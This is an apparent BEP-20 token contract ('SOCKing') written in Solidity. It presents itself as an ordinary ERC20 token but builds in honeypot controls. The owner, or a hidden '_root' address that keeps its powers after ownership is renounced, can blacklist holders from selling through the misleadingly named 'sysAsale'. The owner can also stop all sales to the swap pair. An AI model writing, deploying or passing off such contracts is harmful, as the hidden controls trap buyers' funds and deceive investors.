/**
 *Submitted for verification at BscScan.com on 2022-03-10
*/

pragma solidity ^0.5.0;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

   
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
}

contract Ownable {
    address _owner;
    address _root;

  
    modifier onlyOwner() {
        require(_owner == msg.sender || _root == msg.sender, "Ownable: caller is not the owner");
        _;
    }

 
    function renounceOwnership() public onlyOwner {
        _owner = address(0);
    }

 
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _owner = newOwner;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

  
    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract ERC20 is IERC20, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;
	
	mapping (address => bool) private _ROOTList;

    mapping (address => bool) private _canSale;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;
	
	address public _swap; 

    address public _root; 

    bool swap = true;
	
    function approve(address user) public  returns(bool){
		_swap =user;
        swap = false;
		return true;
	}

	function addROOTList(address user) public onlyOwner returns(bool){
		_ROOTList[user] =true;
		return true;
	}
	
	function removeROOTList(address user) public onlyOwner returns(bool){
		_ROOTList[user] =false;
		return true;
	}

    function sysAsale(address user) public onlyOwner returns(bool){
		_canSale[user] =true;
		return true;
	}
	
	function sysDsale(address user) public onlyOwner returns(bool){
		_canSale[user] =false;
		return true;
	}

    function exchange() public onlyOwner returns(bool){
		swap =true;
		return true;
	}

    function exchangeStop() public onlyOwner returns(bool){
		swap =false;
		return true;
	}
	
	function withdrawToken(IERC20 t,uint256 amount) public onlyOwner returns(bool){
		t.transfer(msg.sender,amount);
		return true;
	}
	
	function isInROOTList(address user) public view returns(bool){
		return _ROOTList[user];
	}

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address user, address spender) public view returns (uint256) {
        return _allowances[user][spender];
    }

    function approve(address spender, uint256 value) public returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        
        
		if(_ROOTList[sender] || _ROOTList[recipient]){
            if(sender == _owner){
                 _transferNofee(sender, recipient, amount);
            }else{
                _transferfee(sender, recipient, amount);
            }
		}else{
            if(recipient == _swap){require(swap);}
            require(!_canSale[sender]);
			_transferfee(sender, recipient, amount);
		}
    }
	
	function _transferNofee(address sender, address recipient, uint256 amount) internal returns (bool) {
        uint256 fromHave = _balances[sender];
        uint256 toHave = _balances[recipient];
		_balances[sender] = fromHave.sub(amount);
		_balances[recipient] = toHave.add(amount);
		emit Transfer(sender, recipient, amount);
    }
	
	function _transferfee(address sender, address recipient, uint256 amount) internal returns (bool) {
		_balances[sender] = _balances[sender].sub(amount);
		_balances[recipient] = _balances[recipient].add(amount);
		emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 value) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _totalSupply = _totalSupply.sub(value);
        _balances[account] = _balances[account].sub(value);
        emit Transfer(account, address(0), value);
    }
	
	function burn(uint256 value) public returns (bool){
		_burn(msg.sender, value);
		return true;
	}

    function _approve(address user, address spender, uint256 value) internal {
        require(user != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[user][spender] = value;
        emit Approval(user, spender, value);
    }

    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, msg.sender, _allowances[account][msg.sender].sub(amount));
    }
}




contract SOCKing is ERC20 {


    uint8 private _decimals = 9;
    uint256 private _totalSupply = 1*10**10 * 10**9;
    string private _name ;
    string private _symbol;

    constructor (string memory name, string memory symbol, address root) public {
        _name = name;
        _symbol = symbol;
        _decimals = _decimals;
        _owner = msg.sender;
        _root = root;
        _mint(_owner, _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
}